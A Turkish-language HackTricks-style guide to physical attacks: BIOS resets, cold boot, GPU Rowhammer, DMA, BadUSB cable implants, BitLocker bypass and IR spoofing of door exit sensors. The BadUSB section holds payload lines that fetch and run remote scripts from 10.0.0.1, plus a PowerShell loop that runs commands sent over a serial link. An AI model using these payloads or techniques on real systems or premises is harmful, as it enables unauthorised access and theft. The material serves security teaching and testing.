# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

**BIOS'u sıfırlama** birkaç şekilde gerçekleştirilebilir. Çoğu anakartta, yaklaşık **30 dakika** çıkarıldığında BIOS ayarlarını ve parolayı sıfırlayan bir **pil** bulunur. Alternatif olarak, belirli pinleri birbirine bağlayarak bu ayarları sıfırlamak için **anakart üzerindeki bir jumper** ayarlanabilir.

Donanım ayarlamalarının mümkün veya pratik olmadığı durumlarda **yazılım araçları** bir çözüm sunar. **Kali Linux** gibi dağıtımlar içeren bir **Live CD/USB** üzerinden sistem çalıştırmak, BIOS parola kurtarmaya yardımcı olabilecek **_killCmos_** ve **_CmosPWD_** gibi araçlara erişim sağlar.

BIOS parolası bilinmediğinde, parolanın **üç kez** yanlış girilmesi genellikle bir hata koduyla sonuçlanır. Bu kod, kullanılabilir bir parola elde etmek için [https://bios-pw.org](https://bios-pw.org) gibi web sitelerinde kullanılabilir.

### UEFI Güvenliği

Geleneksel BIOS yerine **UEFI** kullanan modern sistemlerde, **Secure Boot** özelliğini devre dışı bırakmak da dahil olmak üzere UEFI ayarlarını analiz etmek ve değiştirmek için **chipsec** aracı kullanılabilir. Bu işlem aşağıdaki komutla gerçekleştirilebilir:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM, güç kesildikten sonra verileri kısa bir süre, genellikle **1 ila 2 dakika** boyunca saklar. Bu kalıcılık, sıvı nitrojen gibi soğuk maddeler uygulanarak **10 dakikaya** kadar uzatılabilir. Bu uzatılmış süre içinde, analiz için **dd.exe** ve **volatility** gibi araçlar kullanılarak bir **memory dump** oluşturulabilir.

---

## GPU Rowhammer Against Page Tables

Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU virtual-memory metadata**'sını hedeflediğinde çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPUs** üzerinde yapılan son çalışmalar, ayrıcalıksız CUDA code çalıştıran bir saldırganın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging structure'larını güvenlik açığı bulunan satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya bir ara **page directory** içindeki bitleri değiştirebildiğini göstermektedir. Tek bir translation entry bozulduğunda saldırgan, **arbitrary GPU memory read/write** yeteneği elde edebilir ve ardından host compromise aşamasına geçebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6'da **hammerable rows**'ları profilleyin ve in-DRAM mitigations'ı aşan, refresh-aware / non-uniform hammering pattern'leri oluşturun.
2. Driver'ın page-translation structures'ı varsayılan korumalı pool'da tutmak yerine hammerable physical locations'a yerleştirmesini sağlayacak şekilde **GPU allocations** üzerinde **memory massage** uygulayın. Uygulamada bu, low-memory page-table region'ını tüketmeyi ve kontrollü stride'larla büyük sparse UVM mappings yaymayı içerebilir.
3. Bir page-table / page-directory entry içindeki **PFN** veya aperture-related bits gibi **translation metadata**'larını değiştirin; böylece saldırganın kontrolündeki virtual page, page-table pages'lerine, arbitrary GPU memory'ye veya host-visible system mappings'e çözümlenir.
4. Forged mapping'i yeniden kullanarak ek translation entries'lerini yeniden yazın ve GPU contexts genelinde **arbitrary GPU memory read/write** seviyesine yükselin.

### Host Pivot and Mitigations

- **IOMMU disabled** olduğunda forged system-aperture mappings, GPU'ya arbitrary **host physical memory** erişimi sağlayabilir ve GPU primitive'ini full host compromise'a dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**, last-level page-table entries'lerini hedeflerken **GeForge**, bir page-directory level'ını bozmanın daha kolay olabileceğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'ını yeniden hedefleyebilir. Yalnızca tek bir paging layer'ını security-critical kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** önemini korur; çünkü GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory yolunu engeller, ancak **complete mitigation** değildir. **GPUBreach**, saldırganın GPU-writable, driver-owned CPU buffers'ı bozduğu ve ardından NVIDIA driver memory-safety bugs'larını tetikleyerek IOMMU enabled olsa bile kernel write primitive ve **root shell** elde ettiği ikinci aşama bir pivot gösterir.<sup>[[3]](#references)</sup>
- Desteklenen workstation/server GPUs üzerinde **system-level ECC**, pratik bir hardening adımıdır. ECC bulunmayan consumer GPUs daha zayıf bir defense surface sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060 üzerinde **1,171**, RTX A6000 üzerinde ise **202** bit flip bildirmiştir; bu sayılar çalışan bir host-privilege-escalation chain oluşturmak için yeterli olmuştur.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION**, **FireWire** ve **Thunderbolt** gibi interface'lerle uyumlu, DMA üzerinden **physical memory manipulation** için tasarlanmış bir tooldur. Herhangi bir password kabul edecek şekilde memory'yi patch'leyerek login procedures'ın bypass edilmesini sağlar. Ancak **Windows 10** systems karşısında etkisizdir.

---

## Live CD/USB for System Access

**_sethc.exe_** veya **_Utilman.exe_** gibi system binaries'leri **_cmd.exe_** kopyasıyla değiştirmek, system privileges ile bir command prompt sağlayabilir. **chntpw** gibi tools, bir Windows installation'ın **SAM** file'ını düzenlemek ve password changes yapmak için kullanılabilir.

**Kon-Boot**, Windows kernel veya UEFI'yi geçici olarak modify ederek password bilinmeden Windows systems'a login olmayı kolaylaştıran bir tool'dur. Daha fazla bilgiye [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) adresinden ulaşılabilir.<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: BIOS settings'e erişir.
- **F8**: Recovery mode'a girer.
- Windows banner'ından sonra **Shift** tuşuna basmak autologon'u bypass edebilir.

### BAD USB Devices

**Rubber Ducky** ve **Teensyduino** gibi devices, bir target computer'a bağlandıklarında önceden tanımlanmış payload'ları çalıştırabilen **bad USB** devices oluşturmak için platform görevi görür.

### Volume Shadow Copy

Administrator privileges, PowerShell üzerinden **SAM** file'ı da dahil olmak üzere sensitive files'ın copies'lerinin oluşturulmasına izin verir.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** gibi ESP32-S3 based implants, USB-A→USB-C veya USB-C↔USB-C cables içine gizlenir, yalnızca USB keyboard olarak enumerate edilir ve C2 stack'lerini Wi-Fi üzerinden sunar. Operator'ün tek yapması gereken cable'ı victim host'tan güçlendirmek, `Evil Crow Cable Wind` adlı ve password'ü `123456789` olan bir hotspot oluşturmak ve embedded HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP address'ini) açmaktır.<sup>[[8]](#references)</sup>
- Browser UI; *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* tabs'lerini sunar. Stored payloads OS başına tag'lenir, keyboard layouts çalışma sırasında değiştirilir ve VID/PID strings bilinen peripherals'ları taklit edecek şekilde değiştirilebilir.
- C2 cable'ın içinde bulunduğundan bir phone, host OS'a dokunmadan payloads'ları stage edebilir, execution'ı trigger edebilir ve Wi-Fi credentials'ı yönetebilir; bu, kısa dwell-time gerektiren physical intrusions için idealdir.

### OS-aware AutoExec payloads

- AutoExec rules, USB enumeration'dan hemen sonra çalıştırılmak üzere bir veya daha fazla payload'ı bağlar. Implant, lightweight OS fingerprinting gerçekleştirir ve eşleşen script'i seçer.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution unattended olduğundan, yalnızca bir charging cable'ı değiştirmek logged-on user context altında “plug-and-pwn” initial access elde etmek için yeterli olabilir.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Stored payload bir console açar ve new USB serial device'a gelen her şeyi çalıştıran bir loop'u paste eder. Minimal bir Windows variant'ı şöyledir:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script'i, Android APK'si veya masaüstü executable'ı) başlatır. TCP oturumuna yazılan tüm byte'lar yukarıdaki serial döngüsüne iletilir ve air-gapped host'larda bile uzaktan command execution sağlanır. Çıktı sınırlıdır; bu nedenle operatörler genellikle blind commands (account creation, ek tooling'i staging etme vb.) çalıştırır.

### HTTP OTA update surface

- Aynı web stack genellikle kimlik doğrulaması gerektirmeyen firmware updates sunar. Evil Crow Cable Wind, `/update` üzerinde dinler ve upload edilen binary ne olursa olsun onu flash'lar:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Saha operatörleri, kabloyu açmadan görev sırasında özellikleri hot-swap ile değiştirebilir (ör. flash USB Army Knife firmware'ını yükleyebilir); böylece implant hedef host'a hâlâ bağlıyken yeni yeteneklere geçiş yapabilir.

## BitLocker Encryption'ı Bypass Etme

**recovery password** bir memory dump dosyasında (**MEMORY.DMP**) bulunursa BitLocker encryption potansiyel olarak bypass edilebilir. Bu amaçla **Elcomsoft Forensic Disk Decryptor** veya **Passware Kit Forensic** gibi araçlar kullanılabilir.

---

## Recovery Key Eklemek için Social Engineering

Bir kullanıcıyı, sıfırlardan oluşan yeni bir recovery key ekleyen bir komutu çalıştırmaya ikna ederek social engineering taktikleriyle yeni bir BitLocker recovery key eklenebilir; bu da decryption sürecini basitleştirir.

---

## BIOS'u Factory-Reset Etmek için Chassis Intrusion / Maintenance Switch'lerini Exploit Etme

Birçok modern laptop ve small-form-factor desktop, Embedded Controller (EC) ile BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** içerir. Switch'in temel amacı cihaz açıldığında bir uyarı oluşturmak olsa da vendor'lar bazen switch belirli bir düzende değiştirildiğinde tetiklenen **undocumented recovery shortcut** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack Nasıl Çalışır

1. Switch, EC üzerindeki bir **GPIO interrupt** hattına bağlanmıştır.
2. EC üzerinde çalışan firmware, **timing ve press sayısını** takip eder.
3. Hard-coded bir pattern tanındığında EC, sistem **NVRAM/CMOS içeriğini silen** bir *mainboard-reset* routine'i çağırır.
4. Bir sonraki boot işleminde BIOS varsayılan değerleri yükler – **supervisor password, Secure Boot keys ve tüm özel configuration temizlenir**.

> Secure Boot devre dışı bırakıldığında ve firmware password kaldırıldığında saldırgan, herhangi bir harici OS image'ını kolayca boot edebilir ve dahili drive'lara unrestricted access elde edebilir.

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) için recovery shortcut şöyledir:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini bildiren bir flag ayarlar. Tüm prosedür yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalışmasını sağlamak için hedefi açın veya askıya alma-devam ettirme işlemi gerçekleştirin.
2. Intrusion/maintenance switch'e erişmek için alt kapağı çıkarın.
3. Üreticiye özgü toggle pattern'i tekrarlayın (dokümantasyona, forumlara başvurun veya EC firmware'ini reverse-engineer edin).
4. Yeniden monte edin ve yeniden başlatın – firmware korumaları devre dışı bırakılmış olmalıdır.
5. Bir live USB (ör. Kali Linux) ile boot edin ve olağan post-exploitation işlemlerini gerçekleştirin (credential dumping, data exfiltration, kötü amaçlı EFI binary'leri yerleştirme vb.).

### Tespit ve Azaltma

* OS yönetim konsolundaki chassis-intrusion olaylarını loglayın ve bunları beklenmeyen BIOS reset'leriyle ilişkilendirin.
* Açılmayı tespit etmek için vidalar/kapaklar üzerinde **tamper-evident seals** kullanın.
* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam compromise anlamına geldiğini varsayın.
* Kullanılabildiği durumlarda üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM reset'leri için ek bir cryptographic authorisation gerektirin.

---

## No-Touch Exit Sensörlerine Karşı Gizli IR Injection

### Sensör Özellikleri
- Standart “wave-to-exit” sensörleri, bir near-IR LED emitter'ı, yalnızca doğru carrier'ı (≈30 kHz) birden fazla pulse (~4–10) gördükten sonra logic high bildiren TV kumandası tarzı bir receiver module ile eşleştirir.<sup>[[7]](#references)</sup>
- Plastik bir shroud, emitter ve receiver'ın doğrudan birbirine bakmasını engeller; böylece controller, doğrulanmış herhangi bir carrier'ın yakındaki bir yansımadan geldiğini varsayar ve door strike'ı açan bir relay'i sürer.
- Controller bir hedefin mevcut olduğuna inandığında outbound modulation envelope'u sıklıkla değiştirir, ancak receiver filtrelenmiş carrier ile eşleşen herhangi bir burst'ü kabul etmeye devam eder.

### Attack Workflow
1. **Emission profile'ı yakalayın** – internal IR LED'i süren hem detection öncesi hem de detection sonrası waveform'ları kaydetmek için controller pinlerine bir logic analyser bağlayın.
2. **Yalnızca “post-detection” waveform'unu replay edin** – stock emitter'ı çıkarın/ihmal edin ve harici bir IR LED'i başlangıçtan itibaren tetiklenmiş pattern ile sürün. Receiver yalnızca pulse count/frequency ile ilgilendiğinden, spoofed carrier'ı gerçek bir yansıma olarak değerlendirir ve relay line'ı etkinleştirir.
3. **Transmission'ı gate edin** – receiver'ın AGC'sini veya interference handling logic'ini doyurmadan minimum pulse count'u iletmek için carrier'ı ayarlanmış burst'ler hâlinde gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Sürekli emission, sensörün hassasiyetini hızla düşürür ve relay'in çalışmasını durdurur.

### Uzun Menzilli Reflective Injection
- Bench LED'ini yüksek güçlü bir IR diode, MOSFET driver ve focusing optics ile değiştirmek, yaklaşık 6 m mesafeden güvenilir triggering sağlar.
- Attacker'ın receiver aperture'ına line-of-sight erişimine ihtiyacı yoktur; beam'i camdan görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30°'lik field of view'a girmesini sağlar ve yakın mesafeli bir el hareketini taklit eder.
- Receiver'lar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici beam birden fazla yüzeyden yansıyabilir ve yine de detection threshold'un üzerinde kalabilir.

### Weaponised Attack Torch
- Driver'ı ticari bir flashlight'ın içine yerleştirmek, aracı herkesin görebileceği bir ortamda gizler. Görünür LED'i receiver'ın bandına uygun yüksek güçlü bir IR LED ile değiştirin, ≈30 kHz burst'ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını sink etmek için bir MOSFET kullanın.
- Telescopic zoom lens, menzil ve hassasiyet için beam'i daraltırken MCU kontrolündeki bir vibration motoru, görünür ışık yaymadan modulation'ın etkin olduğuna dair haptic confirmation sağlar.
- Birkaç kayıtlı modulation pattern'i (birbirinden biraz farklı carrier frequency ve envelope'lar) sırayla kullanmak, yeniden markalanmış sensör aileleri arasındaki uyumluluğu artırır; operator böylece relay'in sesli biçimde kliklemesini ve kapının açılmasını sağlayana kadar yansıtıcı yüzeyleri tarayabilir.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
